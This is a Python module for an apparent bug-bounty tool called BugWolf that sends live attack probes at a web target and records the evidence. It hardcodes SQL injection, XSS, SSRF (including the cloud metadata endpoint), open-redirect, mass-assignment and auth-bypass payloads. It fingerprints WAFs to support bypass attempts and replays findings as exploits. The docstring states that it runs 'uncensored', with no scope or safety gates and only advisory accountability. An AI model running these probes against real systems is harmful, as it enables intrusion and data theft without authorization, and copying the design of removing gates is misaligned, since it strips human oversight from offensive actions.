#!/usr/bin/env python3
"""BugWolf Live Execution Harness — real probes, real evidence.

Turns research *units* (hypotheses + payload plans) into actual HTTP probes
against a live target and captures full request/response evidence. This is
the "Planner → Hunter" bridge: everything upstream (threads, units, payload
artifacts) is planning; everything downstream (refutation, reporting) must
be grounded in *recorded, replayable* evidence — and this module is where
that evidence is produced.

Design (deterministic core, uncensored execution, evidence first):

  * Deterministic: probe planning is pure — same unit + target + workspace
    yields the same probe set (stable ordering, bounded payload selection,
    no randomness). Retry/backoff is bounded and reproducible.
  * Uncensored: no scope/safety gates here. The executor sends what the
    unit asks; authorization is the operator's declared responsibility
    (the workflow records scope, it never gates execution).
  * Evidence first: every probe records the full request (method, URL,
    headers, body) and response (status, headers, body, elapsed ms) as
    ``probe_result.evidence`` — the exact artifact ``refutation.py``
    requires for a CONFIRMED verdict (recorded request/response,
    deterministic replay, impact demonstration).
  * WAF-aware: 403/429 + known WAF fingerprints are detected and surfaced
    as ``blocked`` with the defense name, so ``failure_learning`` can
    generate bypass candidates instead of the thread guessing blindly.
  * Transport-injectable: the default transport is stdlib ``urllib`` (the
    project's HTTP convention — no third-party deps). Tests may inject a
    deterministic fake transport to cover classification/WAF/retry logic
    without a live target.

CLI:
  python3 tools/core/live_executor.py --target acme --unit '{"endpoint": "https://acme/api/users/1", "bug_class": "idor"}' --base-url https://acme --json
"""

import hashlib
import json
import sys
import time
import urllib.error
import urllib.request
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

if str(Path(__file__).resolve().parent.parent.parent) not in sys.path:
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
from tools.evidence import redact, redact_text
from tools.reliability import (MAX_ARTIFACT_BYTES, ResourceLimitError,
                               operation_record, record_operation,
                               atomic_write_bytes)
from tools.runtime_paths import target_slug, workspace_root

# Accountability hook (Phase 1): records the operator-declared engagement
# context for every active operation. Advisory only — never gates or reduces
# depth.
try:
    from tools.engagement_context import stamp_operation
except ImportError:  # pragma: no cover - direct script execution fallback
    from engagement_context import stamp_operation

SCHEMA = "bugwolf/live-executor/v1"

DEFAULT_TIMEOUT = 10.0
DEFAULT_RETRIES = 2          # 1 initial + 2 retries = 3 attempts max
RETRY_BACKOFF = 0.25         # seconds, deterministic fixed backoff
MAX_BODY_RECORD = 4096       # preview chars retained inline
MAX_RAW_BODY_BYTES = 50_000_000

# ---------------------------------------------------------------------------
# WAF fingerprints (defense-name -> header keys / body markers)
# ---------------------------------------------------------------------------

WAF_HEADER_HINTS: Dict[str, List[str]] = {
    "cloudflare": ["cf-ray", "cf-chl", "server: cloudflare", "cf-cache-status"],
    "akamai": ["akamai", "x-akamai", "akamaized"],
    "aws-waf": ["x-amzn-waf", "awswaf", "x-amzn-requestid"],
    "imperva": ["x-cdn", "x-iinfo", "incap_ses"],
    "sucuri": ["x-sucuri-id", "x-sucuri-cache"],
    "modsecurity": ["mod_security", "modsecurity"],
    "f5": ["x-cnection", "bigip", "f5"],
}

WAF_BODY_MARKERS: Dict[str, List[str]] = {
    "cloudflare": ["attention required", "cf-chl", "cloudflare ray id",
                   "enable javascript and cookies"],
    "akamai": ["akamai", "reference number", "access denied"],
    "aws-waf": ["request blocked", "awswaf", "robot check"],
    "imperva": ["incapsula", "contact the site owner", "sucuri"],
    "sucuri": ["sucuri", "website firewall", "cloudproxy"],
    "modsecurity": ["mod_security", "not acceptable", "406 not acceptable"],
}

BLOCKED_STATUSES = {403, 406, 429}

# Bug-class -> (method, payload template, technique label). Probe planning
# uses these as the deterministic fallback when the unit carries no payload
# artifacts; the exact body/params are refined per unit below.
BUG_CLASS_TEMPLATES: Dict[str, Dict[str, Any]] = {
    "idor": {"method": "GET", "path_hint": "", "technique": "object-reference"},
    "auth_bypass": {"method": "GET", "path_hint": "", "technique": "auth-omission"},
    "mass_assignment": {"method": "POST", "path_hint": "", "technique": "over-binding"},
    "sql_injection": {"method": "GET", "path_hint": "", "technique": "classic-injection"},
    "ssrf": {"method": "GET", "path_hint": "", "technique": "url-parameter"},
    "parameter_pollution": {"method": "GET", "path_hint": "", "technique": "duplicate-param"},
    "graphql": {"method": "POST", "path_hint": "", "technique": "introspection"},
    "jwt": {"method": "GET", "path_hint": "", "technique": "token-forgery"},
    "rate_limiting": {"method": "GET", "path_hint": "", "technique": "rapid-requests"},
    "xss": {"method": "GET", "path_hint": "", "technique": "reflected"},
    "open_redirect": {"method": "GET", "path_hint": "", "technique": "redirect"},
}

# Deterministic per-bug-class payload/body/param sets (execution details).
SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
    "1' AND SLEEP(1)--", "\" OR \"1\"=\"1",
]
MASS_ASSIGN_BODIES = [
    {"role": "admin"}, {"isAdmin": True}, {"role": "admin", "isAdmin": True},
]
SSRF_TARGETS = ["http://127.0.0.1/", "http://localhost/",
                "http://169.254.169.254/latest/meta-data/"]
GRAPHQL_INTROSPECTION = (
    "query{__schema{queryType{name}types{name kind}}}"
)
XSS_PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "javascript:alert(1)"]
OPEN_REDIRECTS = ["//evil.example", "https://evil.example/",
                  "//example.com/%2f%2fevil.example"]


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _hash(*parts: str) -> str:
    raw = "|".join(str(p) for p in parts)
    return hashlib.sha256(raw.encode()).hexdigest()[:16]


# ---------------------------------------------------------------------------
# Probe planning (deterministic)
# ---------------------------------------------------------------------------

@dataclass
class ProbeSpec:
    """One concrete HTTP request derived from a research unit."""
    probe_id: str
    method: str
    url: str
    headers: Dict[str, str] = field(default_factory=dict)
    body: Any = None                 # dict (JSON) or str (raw)
    technique: str = ""
    bug_class: str = ""
    is_baseline: bool = False        # baseline probes establish the oracle

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


def _resolve_url(unit: Dict[str, Any], target: str, path_hint: str = "") -> str:
    """Absolute URL for a probe: unit.endpoint (if absolute) or target+path."""
    endpoint = str(unit.get("endpoint") or "").strip()
    if endpoint.startswith(("http://", "https://")):
        return endpoint
    base = str(target or "").rstrip("/")
    rel = endpoint.lstrip("/") if endpoint else path_hint.lstrip("/")
    return f"{base}/{rel}" if rel else base


def _unit_payloads(unit: Dict[str, Any]) -> Tuple[Any, List[Any]]:
    """Deterministic payloads from the unit's deterministic_evidence.

    Returns (body, params) — the payload set derived from bridged artifacts
    (U2), falling back to the bug-class template catalog when the unit
    carries none. Bounded and ordered for reproducibility.
    """
    ctx = unit.get("context") or {}
    evidence = ctx.get("deterministic_evidence") or {}
    bug_class = str(unit.get("bug_class") or "").lower()
    params: List[Any] = []
    body = None

    # WAF-bypass payloads (parser_differential artifacts) — try loading the
    # bridged artifact file if it exists and is readable.
    waf_files = evidence.get("waf_payloads") or []
    if bug_class == "sql_injection" and waf_files:
        root = workspace_root()
        for rel in waf_files:
            path = root / rel
            try:
                if path.is_file() and path.suffix == ".json":
                    data = json.loads(path.read_text())
                    for key in ("payloads", "sqli", "values"):
                        val = data.get(key)
                        if isinstance(val, list):
                            params.extend([str(p) for p in val][:8])
                            break
                    if params:
                        break
            except (OSError, ValueError):
                continue

    if not params:
        if bug_class == "sql_injection":
            params = list(SQLI_PAYLOADS)
        elif bug_class == "ssrf":
            params = list(SSRF_TARGETS)
        elif bug_class == "xss":
            params = list(XSS_PAYLOADS)
        elif bug_class == "open_redirect":
            params = list(OPEN_REDIRECTS)
        elif bug_class == "mass_assignment":
            body = MASS_ASSIGN_BODIES[0]
        elif bug_class == "graphql":
            body = {"query": GRAPHQL_INTROSPECTION}
    return body, params


def build_probe_specs(unit: Dict[str, Any], target: str,
                      *, max_probes: int = 8,
                      include_baseline: bool = True) -> List[ProbeSpec]:
    """Deterministically derive concrete probe specs from a research unit.

    Baseline probe (when ``include_baseline``): the unmodified request —
    establishes the oracle response the signal classifier compares against.

    Ordered: baseline first, then technique probes in stable catalog order.
    Bounded by ``max_probes`` (baseline always kept).
    """
    unit = unit or {}
    bug_class = str(unit.get("bug_class") or "web").lower()
    template = BUG_CLASS_TEMPLATES.get(bug_class, {"method": "GET",
                                                   "technique": "generic"})
    method = str(unit.get("method") or template["method"] or "GET").upper()
    technique = str(unit.get("technique") or template["technique"])
    url = _resolve_url(unit, target)
    body, params = _unit_payloads(unit)

    headers = {"Accept": "application/json, */*"}
    auth = unit.get("auth_header")
    if auth:
        headers.setdefault("Authorization", str(auth))

    specs: List[ProbeSpec] = []
    if include_baseline:
        specs.append(ProbeSpec(
            probe_id=_hash("baseline", bug_class, url, method),
            method=method, url=url, headers=dict(headers), body=None,
            technique="baseline", bug_class=bug_class, is_baseline=True))

    def _probe(idx: int, variant: str, method_v: str = "",
               url_v: str = "", headers_v: Optional[Dict[str, str]] = None,
               body_v: Any = None, *, marker: Any = None) -> ProbeSpec:
        probe_headers = dict(headers)
        if headers_v:
            probe_headers.update(headers_v)
        probe_url = url
        if url_v:
            probe_url = url_v
        final_body = body if body_v is None else body_v
        if marker is not None and final_body is None and "?" not in probe_url:
            probe_url = f"{probe_url}?{variant}={_urlencode(marker)}"
        elif marker is not None and final_body is None:
            probe_url = f"{probe_url}&{variant}={_urlencode(marker)}"
        return ProbeSpec(
            probe_id=_hash("probe", bug_class, variant, str(idx)),
            method=method_v or method, url=probe_url,
            headers=probe_headers, body=final_body,
            technique=f"{technique}:{variant}", bug_class=bug_class)

    # Technique-specific probe construction (deterministic, bounded).
    if bug_class == "idor":
        # Object-reference sweep: iterate the id space of the endpoint.
        # NOTE: the id is replaced at the END of the path only — a naive
        # str.replace("/1", ...) would match the "//1" inside the URL's
        # host (http://127.0.0.1/...) and rewrite the request host to
        # e.g. 227.0.0.1 / 027.0.0.1 (octal, unroutable -> 30s hang).
        base_url = url
        for idx, obj_id in enumerate(("1", "2", "42", "0", "-1", "999999")):
            if idx >= max_probes:
                break
            if base_url.endswith("/1"):
                variant_url = f"{base_url[:-2]}/{obj_id}"
            else:
                variant_url = f"{base_url.rstrip('/')}/{obj_id}"
            specs.append(_probe(idx, "id", url_v=variant_url))
    elif bug_class == "auth_bypass":
        for idx, (name, hdr) in enumerate((
                ("no-auth", {}), ("x-admin", {"X-Admin": "true"}),
                ("role-user", {"X-Role": "admin"}))):
            if idx >= max_probes:
                break
            specs.append(_probe(idx, name, headers_v=hdr))
    elif bug_class == "mass_assignment":
        for idx, b in enumerate(MASS_ASSIGN_BODIES):
            if idx >= max_probes:
                break
            specs.append(_probe(idx, "role", body_v=b))
    elif bug_class == "sql_injection":
        for idx, payload in enumerate(params):
            if idx >= max_probes:
                break
            specs.append(_probe(idx, "q", marker=payload))
    elif bug_class == "ssrf":
        for idx, target_url in enumerate(params):
            if idx >= max_probes:
                break
            specs.append(_probe(idx, "url", marker=target_url))
    elif bug_class == "xss":
        for idx, payload in enumerate(params):
            if idx >= max_probes:
                break
            specs.append(_probe(idx, "q", marker=payload))
    elif bug_class == "open_redirect":
        for idx, payload in enumerate(params):
            if idx >= max_probes:
                break
            specs.append(_probe(idx, "next", marker=payload))
    elif bug_class == "parameter_pollution":
        specs.append(_probe(0, "q", url_v=_dup_param_url(url)))
    elif bug_class == "graphql" or body is not None:
        specs.append(_probe(0, "introspection", body_v=body))
    elif bug_class == "rate_limiting":
        # Deterministic burst: same request repeated max_probes times.
        for idx in range(min(max_probes, 6)):
            specs.append(_probe(idx, "burst"))
    else:
        # Generic: one probe of the base request.
        specs.append(_probe(0, "generic"))

    # Bound the non-baseline probes while keeping the baseline.
    out = []
    baseline = [s for s in specs if s.is_baseline]
    probes = [s for s in specs if not s.is_baseline][:max_probes]
    out.extend(baseline)
    out.extend(probes)
    return out


def _urlencode(value: Any) -> str:
    from urllib.parse import quote
    return quote(str(value), safe="")


def _dup_param_url(url: str) -> str:
    """Return url with a duplicated query param (?q=a&q=b) for pollution probes."""
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}q=1&q=2"


# ---------------------------------------------------------------------------
# HTTP transport (default: stdlib urllib, injectable for tests)
# ---------------------------------------------------------------------------

Transport = Callable[[ProbeSpec], Tuple[int, Dict[str, str], str, float]]
UrlOpen = Callable[..., Any]


def _send_once(spec: ProbeSpec, *, timeout: float, urlopen: UrlOpen
               ) -> Tuple[int, Dict[str, str], str, float]:
    """One raw HTTP attempt (no retries). Returns (status, headers, body, ms)."""
    started = time.monotonic()
    try:
        data = None
        if spec.body is not None:
            data = (json.dumps(spec.body).encode()
                    if isinstance(spec.body, dict)
                    else str(spec.body).encode())
        headers = dict(spec.headers or {})
        if data is not None:
            headers.setdefault("Content-Type", "application/json")
        req = urllib.request.Request(spec.url, data=data,
                                     headers=headers, method=spec.method)
        with urlopen(req, timeout=timeout) as resp:
            elapsed = (time.monotonic() - started) * 1000.0
            body = resp.read(MAX_BODY_RECORD + 1).decode(
                "utf-8", errors="replace")[:MAX_BODY_RECORD]
            return resp.status, dict(resp.headers), body, round(elapsed, 3)
    except urllib.error.HTTPError as exc:
        elapsed = (time.monotonic() - started) * 1000.0
        body = exc.read(MAX_BODY_RECORD + 1).decode(
            "utf-8", errors="replace")[:MAX_BODY_RECORD]
        return exc.code, dict(exc.headers), body, round(elapsed, 3)
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return 0, {}, f"transport error: {type(exc).__name__}", 0.0


def _default_transport(spec: ProbeSpec, *, timeout: float = DEFAULT_TIMEOUT,
                       retries: int = DEFAULT_RETRIES,
                       urlopen: UrlOpen = urllib.request.urlopen
                       ) -> Tuple[int, Dict[str, str], str, float]:
    """Send one probe over urllib with bounded retry + fixed backoff.

    Returns (status, headers, body, elapsed_ms). ``status == 0`` signals a
    transport-level failure (connection refused / timeout) so callers can
    classify it distinctly from an HTTP response. ``urlopen`` is injectable
    for deterministic retry tests.
    """
    last_error: Optional[Exception] = None
    for _ in range(retries + 1):
        status, headers, body, elapsed = _send_once(spec, timeout=timeout,
                                                    urlopen=urlopen)
        if status != 0:
            return status, headers, body, elapsed
        last_error = Exception(body) if body else None
        time.sleep(RETRY_BACKOFF)
    return 0, {}, f"transport error: {type(last_error).__name__}", 0.0


# ---------------------------------------------------------------------------
# Classification (deterministic)
# ---------------------------------------------------------------------------

@dataclass
class ProbeResult:
    probe_id: str
    spec: Dict[str, Any]
    status: int
    response_headers: Dict[str, str] = field(default_factory=dict)
    response_body: str = ""
    elapsed_ms: float = 0.0
    waf_detected: bool = False
    waf_name: str = ""
    blocked: bool = False
    timed_out: bool = False
    transport_error: str = ""
    signals: List[str] = field(default_factory=list)
    evidence: Dict[str, Any] = field(default_factory=dict)
    recorded_at: str = ""

    def __post_init__(self):
        if not self.recorded_at:
            self.recorded_at = _now()

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


def detect_waf(status: int, headers: Dict[str, str],
               body: str) -> Tuple[bool, str]:
    """Deterministic WAF detection from status/headers/body fingerprints."""
    low_headers = {str(k).lower(): str(v).lower() for k, v in (headers or {}).items()}
    for name, hints in WAF_HEADER_HINTS.items():
        for hint in hints:
            if ":" in hint:
                key, _, val = hint.partition(":")
                if low_headers.get(key.strip()) and val.strip() in low_headers[key.strip()]:
                    return True, name
            elif hint in low_headers:
                return True, name
    low_body = (body or "").lower()
    for name, markers in WAF_BODY_MARKERS.items():
        for marker in markers:
            if marker in low_body:
                return True, name
    if status in BLOCKED_STATUSES and status != 406:
        # A bare 403 with no fingerprint is still a block (unattributed WAF
        # or origin access control) — surfaced so the loop treats it as a
        # blocker rather than a clean response.
        return True, "unattributed"
    return False, ""


def extract_signals(result: ProbeResult, baseline: Optional[ProbeResult] = None,
                    *, timing_threshold_ms: float = 3000.0) -> List[str]:
    """Deterministic anomaly signals from a probe vs. its baseline.

    Signals are evidence hints for the harness/operator — never a verdict.
    """
    signals: List[str] = []
    body = (result.response_body or "").lower()
    status = result.status

    if status == 0:
        signals.append("transport-failure")
    if result.timed_out:
        signals.append("timeout")
    if result.waf_detected:
        signals.append(f"waf:{result.waf_name}")
    if status == 500:
        signals.append("server-error")
    if status in (404,):
        signals.append("not-found")
    # Server fingerprint leak / mismatch.
    server = str(result.response_headers.get("Server", "")).lower()
    if server and server not in {"nginx", "apache", "cloudflare", "openresty"}:
        signals.append("unexpected-server-header")
    # Error/stack/sql markers in the body.
    for marker in ("traceback", "stack trace", "sql syntax", "syntax error",
                   "internal server error", "exception:", "debug=true"):
        if marker in body:
            signals.append(f"error-body:{marker}")
            break
    # Reflected input echo.
    if result.spec.get("technique") and result.spec.get("url"):
        pass  # reflection check happens in the feedback loop with the payload
    # Timing outlier vs baseline.
    if baseline is not None and baseline.status not in (0,) \
            and result.status not in (0,):
        delta = result.elapsed_ms - baseline.elapsed_ms
        if delta > timing_threshold_ms:
            signals.append(f"timing-anomaly:+{int(delta)}ms")
    # Rate-limit evidence.
    if status == 429:
        signals.append("rate-limited")
    # Successful with unexpected data shape (large body on a small endpoint).
    if status in (200, 201) and len(result.response_body) > 2000:
        signals.append("large-response")
    return signals


def classify_probe(result: ProbeResult, bug_class: str = "",
                   baseline: Optional[ProbeResult] = None) -> str:
    """Deterministic probe verdict: clean | signal | blocked | error.

    ``signal`` means the response differs from the oracle in a way worth
    escalating (status delta, anomaly signal, or expected vulnerability
    response for the bug class). Never a confirmed finding — that requires
    the reproducible-evidence gates in ``refutation.py``.
    """
    if result.transport_error:
        return "error"
    if result.timed_out:
        return "error"
    if result.blocked or result.waf_detected:
        return "blocked"
    signals = extract_signals(result, baseline)
    if any(s.startswith(("error-body", "server-error", "timing-anomaly",
                         "large-response", "rate-limited")) for s in signals):
        return "signal"
    # Bug-class-specific expectations.
    bc = str(bug_class or "").lower()
    if bc in ("idor", "auth_bypass", "mass_assignment") and result.status in (200, 201):
        return "signal"
    if bc in ("sql_injection", "xss") and "error-body" in signals:
        return "signal"
    return "clean"


# ---------------------------------------------------------------------------
# Executor entry points
# ---------------------------------------------------------------------------

def execute_probe(unit: Dict[str, Any], target: str, *,
                  transport: Optional[Transport] = None,
                  timeout: float = DEFAULT_TIMEOUT,
                  retries: int = DEFAULT_RETRIES,
                  max_probes: int = 8,
                  include_baseline: bool = True,
                  project_root: Optional[str] = None) -> ProbeResult:
    """Execute a research unit against a live target; return the probe result.

    Runs the unit's probe set, classifies it, and packages full
    request/response evidence for the refutation pipeline. The *primary*
    (first non-baseline) probe drives the result; the baseline, when
    present, is recorded for oracle comparison in ``extract_signals``.
    """
    unit = unit or {}
    specs = build_probe_specs(unit, target, max_probes=max_probes,
                              include_baseline=include_baseline)
    if not specs:
        return ProbeResult(probe_id="none", spec={}, status=0,
                           transport_error="no probes derivable")
    transport = transport or (lambda s: _default_transport(
        s, timeout=timeout, retries=retries))
    bug_class = str(unit.get("bug_class") or "")

    baseline_result: Optional[ProbeResult] = None
    primary: Optional[ProbeResult] = None
    all_results: List[ProbeResult] = []
    for spec in specs:
        status, headers, body, elapsed = transport(spec)
        timed_out = status == 0 and "timeout" in (body or "")
        result = ProbeResult(
            probe_id=spec.probe_id, spec=spec.to_dict(), status=status,
            response_headers=headers, response_body=body, elapsed_ms=elapsed,
            timed_out=timed_out)
        result.waf_detected, result.waf_name = detect_waf(status, headers, body)
        result.blocked = result.waf_detected
        if spec.is_baseline:
            baseline_result = result
        elif primary is None:
            primary = result
        all_results.append(result)

    primary = primary or (baseline_result or all_results[0])
    primary.signals = extract_signals(primary, baseline_result)
    # Package replayable evidence: full recorded request/response.
    primary.evidence = _build_evidence(primary, unit, bug_class,
                                        project_root=project_root)
    # Do not return a credential-bearing object after persisting a redacted
    # evidence block; callers commonly serialize the full ProbeResult.
    primary.spec = redact(primary.spec)
    primary.response_headers = redact(primary.response_headers)
    primary.response_body = redact_text(primary.response_body)
    primary.evidence = redact(primary.evidence)
    primary.transport_error = (
        f"transport failure: {primary.response_body}" if primary.status == 0
        else "")
    if primary.status == 0:
        primary.timed_out = "timeout" in (primary.response_body or "")
    # Persist evidence for the campaign (state/sessions/<target>/probes.jsonl).
    try:
        stamp_operation("live_probe", target=str(primary.spec.get("url") or target),
                        project_root=project_root,
                        metadata={"probe_id": primary.probe_id,
                                  "bug_class": bug_class})
    except Exception:
        pass  # accountability is advisory and never gates execution
    _persist_probe(primary, project_root=project_root)
    return primary


def _build_evidence(result: ProbeResult, unit: Dict[str, Any],
                    bug_class: str, *,
                    project_root: Optional[str] = None) -> Dict[str, Any]:
    """Build the reproducible-evidence block (recorded request + response)."""
    spec = result.spec or {}
    request_record = redact({
        "method": spec.get("method", ""),
        "url": spec.get("url", ""),
        "headers": spec.get("headers", {}),
        "body": spec.get("body"),
        "technique": spec.get("technique", ""),
        "bug_class": bug_class,
    })
    raw_body = str(result.response_body or "").encode("utf-8", errors="replace")
    response_body: Any = result.response_body
    response_ref = ""
    if len(raw_body) > MAX_BODY_RECORD:
        root = workspace_root(project_root)
        evidence_dir = root / "state" / "sessions" / target_slug(
            str(spec.get("url", "unknown"))) / "evidence"
        try:
            raw_path = evidence_dir / f"{result.probe_id}.response.raw"
            atomic_write_bytes(raw_path, raw_body, max_bytes=MAX_RAW_BODY_BYTES)
            response_body = str(raw_path.relative_to(root))
            response_ref = response_body
        except (OSError, ResourceLimitError, ValueError):
            response_body = redact_text(result.response_body)
    response_record = redact({
        "status": result.status,
        "headers": result.response_headers,
        "body_preview": str(response_body)[:MAX_BODY_RECORD],
        "body_ref": response_ref,
        "elapsed_ms": result.elapsed_ms,
    })
    replay = hashlib.sha256(json.dumps(
        {"request": request_record}, sort_keys=True, default=str).encode()
    ).hexdigest()
    return {
        "schema": "bugwolf/probe-evidence/v1",
        "request": request_record,
        "response": response_record,
        "replay_key": replay,
        "recorded_at": result.recorded_at,
        "waf": result.waf_name,
        "blocked": result.blocked,
        "signals": result.signals,
    }


def _persist_probe(result: ProbeResult, *, project_root: Optional[str] = None
                   ) -> Optional[Path]:
    """Append the probe evidence to state/sessions/<target>/probes.jsonl.

    Advisory: persistence failures never raise (the evidence is already in
    the returned result). ``target`` is derived from the probe URL host.
    """
    try:
        from urllib.parse import urlparse
        host = urlparse((result.spec or {}).get("url", "")).hostname or "unknown"
        slug = target_slug(host)
        root = workspace_root(project_root)
        path = root / "state" / "sessions" / slug / "probes.jsonl"
        path.parent.mkdir(parents=True, exist_ok=True)
        with path.open("a", encoding="utf-8") as stream:
            stream.write(json.dumps(redact(result.to_dict()), sort_keys=True) + "\n")
        return path
    except Exception:
        return None


def execute_exploit(finding: Dict[str, Any], target: str, *,
                    transport: Optional[Transport] = None,
                    timeout: float = DEFAULT_TIMEOUT,
                    retries: int = DEFAULT_RETRIES,
                    project_root: Optional[str] = None) -> ProbeResult:
    """Replay a confirmed finding's recorded request to demonstrate impact.

    Deterministic replay: the request is rebuilt from the finding's
    recorded evidence (same method/url/headers/body) and re-sent. The
    returned result carries the *second* response — the reproducible-evidence
    proof that the finding isn't a one-off.
    """
    evidence = finding.get("evidence") or finding.get("probe_evidence") or {}
    request = evidence.get("request") or {}
    if not request:
        return ProbeResult(probe_id="exploit", spec={}, status=0,
                           transport_error="no recorded request in finding")
    spec = ProbeSpec(
        probe_id=_hash("exploit", str(finding.get("finding_id", ""))),
        method=str(request.get("method") or "GET"),
        url=str(request.get("url") or target),
        headers=dict(request.get("headers") or {}),
        body=request.get("body"),
        technique=str(request.get("technique") or "exploit-replay"),
        bug_class=str(request.get("bug_class") or ""),
    )
    transport = transport or (lambda s: _default_transport(
        s, timeout=timeout, retries=retries))
    status, headers, body, elapsed = transport(spec)
    result = ProbeResult(probe_id=spec.probe_id, spec=spec.to_dict(),
                         status=status, response_headers=headers,
                         response_body=body, elapsed_ms=elapsed)
    result.waf_detected, result.waf_name = detect_waf(status, headers, body)
    result.blocked = result.waf_detected
    result.evidence = _build_evidence(result, finding, spec.bug_class)
    result.spec = redact(result.spec)
    result.response_headers = redact(result.response_headers)
    result.response_body = redact_text(result.response_body)
    result.evidence = redact(result.evidence)
    result.evidence["replay_of"] = str(finding.get("finding_id", ""))
    recorded_response = evidence.get("response") or {}
    expected_status = recorded_response.get("status")
    try:
        expected_status_value = int(expected_status) if expected_status is not None else None
    except (TypeError, ValueError):
        expected_status_value = None
    expected_blocked = bool(evidence.get("waf")) or (
        expected_status_value in {403, 406, 429}
    )
    result.evidence["reproduced"] = (
        expected_status_value is not None
        and status != 0
        and status == expected_status_value
        and result.blocked == expected_blocked
    )
    try:
        stamp_operation("exploit_replay",
                        target=str(request.get("url") or target),
                        project_root=project_root,
                        metadata={"finding_id": str(finding.get("finding_id", "")),
                                  "probe_id": result.probe_id})
    except Exception:
        pass  # accountability is advisory and never gates execution
    return result


def verify_reproducibility(finding: Dict[str, Any], target: str, *,
                           transport: Optional[Transport] = None,
                           timeout: float = DEFAULT_TIMEOUT,
                           retries: int = DEFAULT_RETRIES) -> bool:
    """Deterministic replay check: does the recorded request reproduce?

    Re-sends the finding's recorded request and compares the *status code*
    (and WAF/block state) with the recorded response. Returns True when the
    reproduction matches — the finding is deterministic, not a one-off.
    """
    replay = execute_exploit(finding, target, transport=transport,
                             timeout=timeout, retries=retries)
    if replay.status == 0:
        return False
    evidence = finding.get("evidence") or finding.get("probe_evidence") or {}
    recorded = evidence.get("response") or {}
    expected_status = recorded.get("status")
    if expected_status is None:
        return False
    try:
        expected_status_value = int(expected_status)
    except (TypeError, ValueError):
        return False
    expected_blocked = bool(evidence.get("waf")) or (
        expected_status_value in {403, 406, 429}
    )
    return replay.status == expected_status_value and replay.blocked == expected_blocked


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> int:
    import argparse
    parser = argparse.ArgumentParser(
        description="BugWolf Live Execution Harness")
    parser.add_argument("--target", required=True, help="Target slug")
    parser.add_argument("--unit", default="{}",
                        help="Research unit JSON (endpoint, bug_class, ...)")
    parser.add_argument("--base-url", default="",
                        help="Target base URL when unit.endpoint is relative")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    parser.add_argument("--retries", type=int, default=DEFAULT_RETRIES)
    parser.add_argument("--project-root", default="",
                        help="Workspace root for evidence persistence")
    parser.add_argument("--engagement", default="",
                        help="Engagement id recorded in the operation audit trail")
    parser.add_argument("--json", action="store_true")
    args = parser.parse_args()

    try:
        unit = json.loads(args.unit)
    except json.JSONDecodeError as exc:
        print(json.dumps({"ok": False, "error": f"invalid unit JSON: {exc}"}))
        return 2

    result = execute_probe(unit, args.base_url, timeout=args.timeout,
                           retries=args.retries,
                           project_root=args.project_root or None)
    out = result.to_dict()
    print(json.dumps(out, indent=2, sort_keys=True) if args.json
          else json.dumps({"ok": True, "status": out["status"],
                           "signals": out["signals"],
                           "waf": out["waf_name"],
                           "blocked": out["blocked"]}))
    return 0


if __name__ == "__main__":
    sys.exit(main())
